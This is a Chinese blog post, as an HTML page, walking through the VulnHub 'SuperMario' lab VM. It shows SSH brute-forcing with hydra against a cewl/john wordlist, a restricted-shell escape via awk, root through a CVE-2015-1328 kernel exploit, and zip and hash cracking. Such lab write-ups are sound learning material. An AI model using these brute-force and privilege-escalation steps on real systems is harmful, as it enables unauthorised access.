@@ -1,0 +1,544 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/icon/logo.ico?v=1.7.0" type="image/png" sizes="32x32"><meta name="description" content="该靶机难度中档，一共两个flag+root权限，本次靶机的关键在于枚举...本机IP:192.168.0.101 kali:192.168.80.129 靶机:192.168.80.128">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulnHub靶机系列:SuperMario">
+<meta property="og:url" content="https://hyswzw.github.io/2020/11/23/VulnHub_SuperMario/index.html">
+<meta property="og:site_name" content="Weigr的小站">
+<meta property="og:description" content="该靶机难度中档，一共两个flag+root权限，本次靶机的关键在于枚举...本机IP:192.168.0.101 kali:192.168.80.129 靶机:192.168.80.128">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://hyswzw.github.io/2020/11/23/VulnHub_SuperMario/1.png">
+<meta property="og:image" content="https://hyswzw.github.io/2020/11/23/VulnHub_SuperMario/2.png">
+<meta property="og:image" content="https://hyswzw.github.io/2020/11/23/VulnHub_SuperMario/3.png">
+<meta property="og:image" content="https://hyswzw.github.io/2020/11/23/VulnHub_SuperMario/4.png">
+<meta property="og:image" content="https://hyswzw.github.io/2020/11/23/VulnHub_SuperMario/5.png">
+<meta property="og:image" content="https://hyswzw.github.io/2020/11/23/VulnHub_SuperMario/6.png">
+<meta property="og:image" content="https://hyswzw.github.io/2020/11/23/VulnHub_SuperMario/7.png">
+<meta property="og:image" content="https://hyswzw.github.io/2020/11/23/VulnHub_SuperMario/8.png">
+<meta property="og:image" content="https://hyswzw.github.io/2020/11/23/VulnHub_SuperMario/9.png">
+<meta property="og:image" content="https://hyswzw.github.io/2020/11/23/VulnHub_SuperMario/10.png">
+<meta property="og:image" content="https://hyswzw.github.io/2020/11/23/VulnHub_SuperMario/11.png">
+<meta property="og:image" content="https://hyswzw.github.io/2020/11/23/VulnHub_SuperMario/12.png">
+<meta property="og:image" content="https://hyswzw.github.io/2020/11/23/VulnHub_SuperMario/13.png">
+<meta property="og:image" content="https://hyswzw.github.io/2020/11/23/VulnHub_SuperMario/14.png">
+<meta property="og:image" content="https://hyswzw.github.io/2020/11/23/VulnHub_SuperMario/15.png">
+<meta property="og:image" content="https://hyswzw.github.io/2020/11/23/VulnHub_SuperMario/16.png">
+<meta property="og:image" content="https://hyswzw.github.io/2020/11/23/VulnHub_SuperMario/17.png">
+<meta property="og:image" content="https://hyswzw.github.io/2020/11/23/VulnHub_SuperMario/18.png">
+<meta property="og:image" content="https://hyswzw.github.io/2020/11/23/VulnHub_SuperMario/19.png">
+<meta property="og:image" content="https://hyswzw.github.io/2020/11/23/VulnHub_SuperMario/20.png">
+<meta property="og:image" content="https://hyswzw.github.io/2020/11/23/VulnHub_SuperMario/21.png">
+<meta property="og:image" content="https://hyswzw.github.io/2020/11/23/VulnHub_SuperMario/22.png">
+<meta property="og:image" content="https://hyswzw.github.io/2020/11/23/VulnHub_SuperMario/23.png">
+<meta property="og:image" content="https://hyswzw.github.io/2020/11/23/VulnHub_SuperMario/24.png">
+<meta property="og:image" content="https://hyswzw.github.io/2020/11/23/VulnHub_SuperMario/25.png">
+<meta property="og:image" content="https://hyswzw.github.io/2020/11/23/VulnHub_SuperMario/26.png">
+<meta property="og:image" content="https://hyswzw.github.io/2020/11/23/VulnHub_SuperMario/27.png">
+<meta property="og:image" content="https://hyswzw.github.io/2020/11/23/VulnHub_SuperMario/28.png">
+<meta property="article:published_time" content="2020-11-23T09:15:43.000Z">
+<meta property="article:modified_time" content="2020-12-27T08:07:29.100Z">
+<meta property="article:author" content="Weigr">
+<meta property="article:tag" content="靶机">
+<meta property="article:tag" content="VulnHub">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hyswzw.github.io/2020/11/23/VulnHub_SuperMario/1.png"><meta name="keywords" content="Weigr, Weigr的小站"><meta name="description" content=""><title>VulnHub靶机系列:SuperMario</title><link ref="canonical" href="https://hyswzw.github.io/2020/11/23/VulnHub_SuperMario/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=1.7.0"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":true},
+  post_widget: {"end_text":true},
+  night_mode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"carbon","highlight":"light","word_wrap":false},
+  reward: false,
+  fancybox: false,
+  zoom_image: {"enable":true,"mask_color":"rgba(0,0,0,0.6)"},
+  gallery_waterfall: undefined,
+  lazyload: undefined,
+  pjax: {"scrollTo2screen":false},
+  external_link: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copy_button":"复制","copy_success":"复制成功","copy_error":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 4.2.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">搜索</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Weigr的小站</div><div class="header-banner-info__subtitle">永远保持一颗学徒的心</div></div><div class="header-banner-arrow"><div class="header-banner-arrow__icon"><i class="fas fa-angle-down"></i></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">VulnHub靶机系列:SuperMario</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2020-11-23</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2020-12-27</span></span><span class="post-meta-item post-meta-item--wordcount"><span class="post-meta-item__icon"><i class="far fa-file-word"></i></span><span class="post-meta-item__info">字数统计</span><span class="post-meta-item__value">2.1k</span></span><span class="post-meta-item post-meta-item--readtime"><span class="post-meta-item__icon"><i class="far fa-clock"></i></span><span class="post-meta-item__info">阅读时长</span><span class="post-meta-item__value">17分</span></span><span class="post-meta-item post-meta-item--visitors"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">阅读次数</span><span class="post-meta-item__value" id="busuanzi_value_page_pv"></span></span></div></header><div class="post-body">
+        <h2 id="前言">
+          <span class="heading-link">前言</span>
+        </h2>
+      <p>该靶机难度中档，一共两个flag+root权限，本次靶机的关键在于枚举。</p>
+
+        <h2 id="环境">
+          <span class="heading-link">环境</span>
+        </h2>
+      <p>本机IP:192.168.0.101<br>kali:192.168.80.129<br>靶机:192.168.80.128</p>
+
+        <h2 id="信息收集">
+          <span class="heading-link">信息收集</span>
+        </h2>
+      <p>端口探测:</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -Pn 192.168.80.128</span><br></pre></td></tr></table></div></figure>
+<img src="/2020/11/23/VulnHub_SuperMario/1.png" class title="端口探测">
+<p>先看看8180这个端口是什么情况:</p>
+<img src="/2020/11/23/VulnHub_SuperMario/2.png" class title="Web">
+<p>显示是一个Nginx欢迎界面,国际惯例,使用dirbuster先跑一波目录:</p>
+<img src="/2020/11/23/VulnHub_SuperMario/3.png" class title="目录">
+<p>发现一个可疑目录,访问之:</p>
+<img src="/2020/11/23/VulnHub_SuperMario/4.png" class title="可疑目录">
+<p>发现了Apache的基于名称的虚拟主机配置文件,用于在同一台物理机上搭建多个web网站(其实我是网上搜索很久,最后在Apache官网文档才知道这是在配置什么( ╯□╰ )),配合这篇<span class="exturl"><a class="exturl__link" href="https://www.cnblogs.com/diantong/p/10907069.html" target="_blank" rel="noopener">文章</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>更好理解.<br>为了能够访问到该域名,我们需要修改hosts,在里面添加一条记录:<br><code>192.168.80.128 mario.supermariohost.local</code><br>然后访问mario.supermariohost.local:8180,发现是一个网页版mario小游戏:</p>
+<img src="/2020/11/23/VulnHub_SuperMario/5.png" class title="网页版马里奥">
+<p>直接扫描目录看看:</p>
+<img src="/2020/11/23/VulnHub_SuperMario/6.png" class title="目录">
+<p>发现页面:</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">command.php</span><br><span class="line">mario.php</span><br><span class="line">luigi.php</span><br></pre></td></tr></table></div></figure>
+<p>mario.php不用多看,是默认页面,主要看其他两个页面。command.php好像是在执行SQL语句查询:输入用户名,返回是否存在该用户名。</p>
+<img src="/2020/11/23/VulnHub_SuperMario/7.png" class title="搜索页面">
+<p>luigi.php是一封信,没有什么新发现,应该暗藏玄机,但我目前没看出来,留着后续再看。</p>
+<img src="/2020/11/23/VulnHub_SuperMario/8.png" class title="暗藏玄机">
+<p>根据目前信息,好像能利用的点,就只有command.php,试试:<br>随便输入一个用户名试一下,会返回是否找到该用户名。但多试几次好像又不对劲,同样的输入,你多试几次,会出现不一样的结果,像随机的一样。但一共只有三种结果:<code>用户名未找到 用户名存在 空</code></p>
+<img src="/2020/11/23/VulnHub_SuperMario/9.png" class title="输入测试">
+<p>这三个页面我研究了好一会儿还是没发现有什么问题,最后得出结论:<code>很可能是出题者故意弄的坑</code><br>俗话说渗透无门,枚举开路.web没发现漏洞,那只能使用最粗暴的手段了。三个页面也就luigi.php有不少信息,那搜集一下luigi.php页面信息生成用户名SSH枚举的字典吧。<br>这里使用kali自带的cewl进行页面单词爬取,只收集单词长度大于3的,-m 3:</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl -w name.txt -d 1 -m 3 http://mario.supermariohost.local:8180/luigi.php</span><br></pre></td></tr></table></div></figure>
+<img src="/2020/11/23/VulnHub_SuperMario/10.png" class title="收集信息">
+<p>一共收集到44个关键字,然后用kali自带的工具john生成字典:</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=name.txt --stdout --rules &gt; pass.txt</span><br></pre></td></tr></table></div></figure>
+<img src="/2020/11/23/VulnHub_SuperMario/11.png" class title="密码字典">
+<p>好,万事具备只欠东风,接下来就用hydra爆破密码,用户名为luigi:</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l luigi -P pass.txt -f ssh://192.168.80.128 -t 3</span><br></pre></td></tr></table></div></figure>
+<p>由于线程开的很低,经过漫长的等待之后终于得到账号密码:<br><strong><code>luigi : luigi1</code></strong><br>不得不说,根据目标信息,然后生成专门的字典是很重要的,这样爆破的时候往往有奇效</p>
+<img src="/2020/11/23/VulnHub_SuperMario/12.png" class title="爆破结果">
+<p>得到登陆账号,废话不多说直接登录ssh</p>
+<img src="/2020/11/23/VulnHub_SuperMario/13.png" class title="登录ssh">
+<p>登上去后,提示shell受限,输入?或者help获取允许执行的命令,那我们看看允许执行哪些命令呢?根据提示输入<strong>?</strong></p>
+<img src="/2020/11/23/VulnHub_SuperMario/14.png" class title="?">
+<p>只允许执行以下命令:</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk cat <span class="built_in">cd</span> clear <span class="built_in">echo</span> <span class="built_in">exit</span> <span class="built_in">help</span> <span class="built_in">history</span> ll lpath ls lsudo vim</span><br></pre></td></tr></table></div></figure>
+<p>但说不让执行就不能执行?偏要试一试其他命令:</p>
+<img src="/2020/11/23/VulnHub_SuperMario/15.png" class title="很好">
+<p>果然没骗我,其他命令都禁止执行。但在允许执行的命令中竟然有awk,话说我个菜鸡awk都没怎么用过,随手百度了一下:说awk是一种强大的文本处理工具。竟然都说到很强大了,那执行个命令不过分吧:</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">awk <span class="string">'BEGIN &#123;system("/bin/sh")&#125;'</span></span><br><span class="line">成功利用awk突破了shell限制</span><br></pre></td></tr></table></div></figure>
+<img src="/2020/11/23/VulnHub_SuperMario/16.png" class title="awk执行命令">
+<p>查看linux内核版本(kali连接靶机SSH):</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></div></figure>
+<img src="/2020/11/23/VulnHub_SuperMario/17.png" class title="内核版本">
+<p>内核版本不是太高,应该能找到exp,由于靶机不通外网,因此我先将exp下载到kail,然后再scp下载到靶机上,本次提权使用的是<span class="exturl"><a class="exturl__link" href="https://github.com/SecWiki/linux-kernel-exploits/blob/master/2015/CVE-2015-1328/37292.c" target="_blank" rel="noopener">CVE-2015-1328</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">scp root@192.168.80.129:/root/tmp/ofs.c ofs.c  <span class="comment">#下载exp</span></span><br><span class="line">gcc ofs.c -o ofs  <span class="comment">#编译并运行exp:</span></span><br><span class="line">chmod a+x ofs</span><br><span class="line">/ofs</span><br></pre></td></tr></table></div></figure>
+<p>成功提权到root,个人不喜欢用sh,使用bash吧。<br>那么现在的任务就是找到靶机上的两个flag。切换到root目录发现一个flag.zip的压缩文件:</p>
+<img src="/2020/11/23/VulnHub_SuperMario/18.png" class title="zip文件">
+<p>解压缩:</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip flag.zip</span><br></pre></td></tr></table></div></figure>
+<p>发现被加密了,将该zip包放到kali上,找找kali上用于枚举zip包密码的工具：</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apropos 或者 man -k</span><br><span class="line">搜索能够破解zip密码的工具</span><br><span class="line">这两个命令可在一些特定的包含系统命令的简短描述的数据库文件里查找关键字，然后把结果输出</span><br></pre></td></tr></table></div></figure>
+<img src="/2020/11/23/VulnHub_SuperMario/19.png" class title="破解zip工具">
+<p>到一个fcrackzip好像能够进行zip密码破解,下面是用法:</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">USAGE: fcrackzip</span><br><span class="line">          [-b|--brute-force]            use brute force algorithm</span><br><span class="line">          [-D|--dictionary]             use a dictionary</span><br><span class="line">          [-B|--benchmark]              execute a small benchmark</span><br><span class="line">          [-c|--charset characterset]   use characters from charset</span><br><span class="line">          [-h|--<span class="built_in">help</span>]                   show this message</span><br><span class="line">          [--version]                   show the version of this program</span><br><span class="line">          [-V|--validate]               sanity-check the algortihm</span><br><span class="line">          [-v|--verbose]                be more verbose</span><br><span class="line">          [-p|--init-password string]   use string as initial password/file</span><br><span class="line">          [-l|--length min-max]         check password with length min to max</span><br><span class="line">          [-u|--use-unzip]              use unzip to weed out wrong passwords</span><br><span class="line">          [-m|--method num]             use method number <span class="string">"num"</span> (see below)</span><br><span class="line">          [-2|--modulo r/m]             only calculcate 1/m of the password</span><br><span class="line">          file...                    the zipfiles to crack</span><br><span class="line">methods compiled <span class="keyword">in</span> (* = default):</span><br><span class="line">0: cpmask</span><br><span class="line">1: zip1</span><br><span class="line">*2: zip2, USE_MULT_TAB</span><br></pre></td></tr></table></div></figure>
+<p>kali是有自带字典的,在/usr/share/wordlists中,名为rockyou.txt.gz。解压后进行密码破解:</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gunzip rockyou.txt.gz  <span class="comment"># 解压缩</span></span><br><span class="line">fcrackzip -uv -D -p /usr/share/wordlist/rockyou.txt flag.zip</span><br></pre></td></tr></table></div></figure>
+<img src="/2020/11/23/VulnHub_SuperMario/20.png" class title="破解zip密码">
+<p>解压密码:<strong><code>ilovepeach</code></strong> 。再次感叹,爆破猜解真是简单粗暴!解压看下内容:</p>
+<img src="/2020/11/23/VulnHub_SuperMario/21.png" class title="flag内容">
+<p>内容大概意思是需要将全部用户的口令找到才算完全过关。老规矩,这里还是使用john进行hash猜解,不过字典得重新生成一下(别问,问就是我不将压缩密码加进去没跑出来。囧),首先用于生成字典的单词我们要加上一个刚刚得到的压缩包密码<code>ilovepeach</code>:</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> ilovepeache &gt;&gt; name.txt</span><br><span class="line">tail name.txt</span><br></pre></td></tr></table></div></figure>
+<img src="/2020/11/23/VulnHub_SuperMario/22.png" class title="增加密码">
+<p>使用john生成字典:</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=name.txt --stdout --rules &gt; hash.txt</span><br><span class="line">cat hash.txt | wc -l</span><br></pre></td></tr></table></div></figure>
+<p>一共生成了2306条密码</p>
+<img src="/2020/11/23/VulnHub_SuperMario/23.png" class title="构造字典">
+<p>不得不说,john真是个神器不光能用来生成字典,更能用来跑hash,但由于是虚拟机且本菜鸡电脑实在太垃圾,内存还不够,导致下面这种结果。</p>
+<img src="/2020/11/23/VulnHub_SuperMario/24.png" class title="垃圾电脑毁我青春">
+<p>不过好在本机windows上安装了pentestbox,自带john<br>先将kali上生成的字典传到本机上,方法很多,可以用python,scp,nc等等，然后开始破解:</p>
+<img src="/2020/11/23/VulnHub_SuperMario/25.png" class title="破解hash">
+<p>不得不说一句,john牛逼,获得密码:</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ilovepeach!</span><br><span class="line">ilovepeach!</span><br></pre></td></tr></table></div></figure>
+<p>话说两个密码hash都不一样,解出来竟然是一样的密码(其实是盐值不一样)。不会是错的吧,试一试:</p>
+<img src="/2020/11/23/VulnHub_SuperMario/26.png" class title="得到密码">
+<p>验证成功完全没问题嘿嘿。<br>那到这里,耗时一周多的超级马里奥靶机渗透之旅就结束啦。</p>
+<hr>
+<p><strong>PS:</strong><br>回到第一步,端口和服务探测那里,我们看OpenSSH版本是6.6.1,该版本其实是存在用户名枚举漏洞的,即<span class="exturl"><a class="exturl__link" href="https://github.com/trimstray/massh-enum" target="_blank" rel="noopener">CVE-2018-15473</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<img src="/2020/11/23/VulnHub_SuperMario/27.png" class title="ssh用户名枚举">
+<p>用法:</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">massh-enum --hosts 192.168.80.128 --users wordlists/users</span><br></pre></td></tr></table></div></figure>
+<p>也可以用msf自带的ssh枚举模块枚举出用户:</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/ssh/ssh_enumusers</span><br><span class="line"></span><br><span class="line">设置目标ip</span><br><span class="line"><span class="built_in">set</span> rhost 192.168.80.128</span><br><span class="line"></span><br><span class="line">设置用户名文件,这里可以用前面cewl在luigi.php页面收集到的单词字典,也可以枚举单个用户</span><br><span class="line">本次演示,就使用单个用户以节约时间:</span><br><span class="line"><span class="built_in">set</span> username mario</span><br><span class="line">其他选项默认即可</span><br></pre></td></tr></table></div></figure>
+<img src="/2020/11/23/VulnHub_SuperMario/28.png" class title="msf_ssh用户名枚举">
+<hr>
+
+        <h2 id="总结">
+          <span class="heading-link">总结</span>
+        </h2>
+      <p>本次靶机渗透完全诠释了信息收集和信息整合利用的重要性,不论是第一步的SSH用户名枚举、还是用cewl爬取luigi.php页面然后john生成社工字典、还有最后破解出flag.zip压缩密码然后将其整合进单词字典再重新生成用于破解hash的密码,这些都是渗透中的细节,少做一步,可能目标就很难被拿下。<br>此次靶机渗透知识点:</p>
+<ul>
+<li>增加Apache搭建两个不同站点,虚拟主机的了解<ul>
+<li>有三种方法：<ol>
+<li>通过不同的IP地址   </li>
+<li>通过不同的域名　</li>
+<li>通过不同的端口号</li>
+</ol>
+</li>
+</ul>
+</li>
+<li>使用两款强大的hash破解工具:John the Ripper &amp; hashcat</li>
+<li>学会zip破解工具fcrackzip的用法</li>
+<li>了解到awk文本处理语言的基本用法</li>
+<li>信息收集、整合真的很重要</li>
+<li>没有头绪的时候,枚举会给你带来惊喜,不过针对目标的字典不能少</li>
+</ul>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="https://HYSWZW.github.io">Weigr</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="https://hyswzw.github.io/2020/11/23/VulnHub_SuperMario/">https://hyswzw.github.io/2020/11/23/VulnHub_SuperMario/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="https://hyswzw.github.io/tags/%E9%9D%B6%E6%9C%BA/">靶机</a></span><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="https://hyswzw.github.io/tags/VulnHub/">VulnHub</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2020/12/14/VulnHub_BlackMarket/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">VulnHub靶机系列:BlackMarket</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2020/11/15/VulnHub_WebForPentester/"><span class="paginator-prev__text">VulnHub靶机系列:Web For Pentester</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div><div class="comments" id="comments"><div id="gitalk-container"></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">
+          前言
+        </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#环境"><span class="toc-number">2.</span> <span class="toc-text">
+          环境
+        </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#信息收集"><span class="toc-number">3.</span> <span class="toc-text">
+          信息收集
+        </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">4.</span> <span class="toc-text">
+          总结
+        </span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/icon/author.ico" alt="avatar"></div><p class="sidebar-ov-author__text">永远保持一颗学徒的心</p></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/HYSWZW/" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a><a class="sidebar-ov-social-item" href="tencent://message?uin=1432828313" target="_blank" rel="noopener" data-popover="QQ" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-qq"></i></span></a></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">14</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">9</div><div class="sidebar-ov-state-item__name">分类</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" data-popover="知识共享" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2020</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>Weigr</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span></div><div class="busuanzi"><span class="busuanzi-siteuv"><span class="busuanzi-siteuv__icon"><i class="fas fa-user"></i></span><span class="busuanzi-siteuv__info">访问人数</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_uv"></span></span><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__info">浏览总量</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div><div>Hosted in <a href="https://pages.github.com/" target="_blank" rel="noopener">GitHub Pages<a/></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="搜索文章（支持多关键词，请用空格分隔）"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/ribbon.js@latest/dist/ribbon.min.js" size="100" alpha="0.8" zIndex="0"></script><script>function initSearch() {
+  var isXML = true;
+  var search_path = 'search.json';
+
+  if (!search_path) {
+    search_path = 'search.xml';
+  } else if (/json$/i.test(search_path)) {
+    isXML = false;
+  }
+
+  var path = '/' + search_path;
+  $.ajax({
+    url: path,
+    dataType: isXML ? 'xml' : 'json',
+    async: true,
+    success: function (res) {
+      var datas = isXML ? $('entry', res).map(function () {
+        // 将 XML 转为 JSON
+        return {
+          title: $('title', this).text(),
